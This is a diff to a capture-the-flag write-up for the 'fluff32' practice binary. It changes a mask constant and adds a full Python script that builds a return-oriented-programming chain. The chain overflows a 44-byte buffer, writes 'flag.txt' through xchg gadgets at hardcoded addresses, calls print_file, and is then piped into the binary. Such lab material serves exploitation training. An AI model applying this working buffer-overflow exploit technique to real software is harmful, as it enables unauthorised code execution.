@@ -23,7 +23,7 @@ And the next table describes the ROP chain itself:
 |----|--------------|-------------------------------------|-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
 | 1  | 1            | 44 garbage bytes                    |                                                                                                                                                                                                                                                                                     |
 | 2  | 2            | pop_bswap_cx, `memory4string`       | `memory4string` in big-endian.                                                                                                                                                                                                                                                      |
-| 3  | 2            | pop_bp, get_mask(`"f"`)             | The function `get_mask` calculates the bit sequence needed<br/>for a register that serves as a mask in the `xchg` instruction<br/>(with a constant value of `0xdeadbeef` on which the mask operates)<br/>so that the operation produces the desired character. In this case, `"f"`. |
+| 3  | 2            | pop_bp, get_mask(`"f"`)             | The function `get_mask` calculates the bit sequence needed<br/>for a register that serves as a mask in the `xchg` instruction<br/>(with a constant value of `0xb0bababa` on which the mask operates)<br/>so that the operation produces the desired character. In this case, `"f"`. |
 | 4  | 2            | prepare_dx                          |                                                                                                                                                                                                                                                                                     |
 | 5  | 2            | exchange_byte                       | After this operation, the string will be `"f"`                                                                                                                                                                                                                                      |
 | 6  | 3            | pop_bswap_cx, `memory4string+1`     | `memory4string+1` in big-endian.                                                                                                                                                                                                                                                    |
@@ -60,7 +60,89 @@ Where `"XXXX"` is the return address from the `print_file` function, which is no
 
 All that remains is to build the Python script that creates the ROP chain, and we’re done!
 
+```python
+# chain_builder.py
+import struct
 
+def little_endian(number):
+    """
+    : The function accepts a number not
+    : exceeding 4 bytes in size and returns it
+    : as a string of hexadecimal characters in
+    : little-endian format.
+    """
+    return struct.pack("<I", number)
+
+
+
+def big_endian(number):
+    """
+    : The function accepts a number not
+    : exceeding 4 bytes in size and returns it
+    : as a string of hexadecimal characters in
+    : big-endian format.
+    """
+    return struct.pack(">I", number)
+
+
+def get_mask(target, value=0xb0bababa):
+    target_bits = bin(ord(target))[2:]
+    value_bits  = bin(value)[2:]
+
+    mask_bits   = ''
+
+    while(target_bits):
+        if target_bits[-1] == value_bits[-1]:
+            mask_bits = '1' + mask_bits
+            target_bits = target_bits[:-1]
+        else:
+            mask_bits = '0' + mask_bits
+
+        value_bits = value_bits[:-1]
+
+    while(value_bits):
+        if value_bits[-1] == '0':
+            mask_bits = '1' + mask_bits
+        else:
+            mask_bits = '0' + mask_bits
+        value_bits = value_bits[:-1]
+
+    return int(mask_bits, 2)
+
+# Parts of the chain
+fill_buffer   = b"X"*44
+
+print_file    = little_endian(0x080483d0)
+
+memory4string = 0x0804a018
+
+pop_swap_cx   = little_endian(0x08048558)
+pop_bp        = little_endian(0x080485bb)
+prepare_dx    = little_endian(0x08048543)
+exchange_byte = little_endian(0x08048555) 
+
+# Building the chain
+print(hex(get_mask("f")))
+ROP_Chain = fill_buffer
+
+for i,c in enumerate("flag.txt"):
+    ROP_Chain += pop_swap_cx + big_endian(memory4string+i)
+    ROP_Chain += pop_bp + little_endian(get_mask(c))
+    ROP_Chain += prepare_dx
+    ROP_Chain += exchange_byte
+
+ROP_Chain += print_file + b"XXXX" + little_endian(memory4string)
+
+# Saving the chain in a binary file
+with open("rop_chain", "wb") as f:
+    f.write(ROP_Chain)
+```
+```
+python3 chain_builder.py
+```
+```
+cat rop_chain | ./fluff32
+```
 
 ```python
 def get_mask(target, value):
